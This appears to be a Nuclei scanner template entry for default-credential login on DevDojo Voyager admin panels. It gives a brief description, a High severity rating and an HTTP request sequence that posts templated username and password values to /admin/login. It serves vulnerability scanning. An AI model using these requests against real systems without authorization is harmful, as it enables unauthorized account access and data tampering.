# Nuclei Template: DevDojo Voyager - Default login
**Template ID:** devdojo-voyager-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`devdojo-voyager-default-login.yaml`)

## Vulnerability Information & PoC

## Description
DevDojo Voyager contains default credentials when run with dummy data. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
GET /admin/login HTTP/1.1
Host: {{Hostname}}

POST /admin/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

_token={{csrf}}&email={{username}}&password={{password}}&
```

## References
- https://voyager-docs.devdojo.com/getting-started/installation
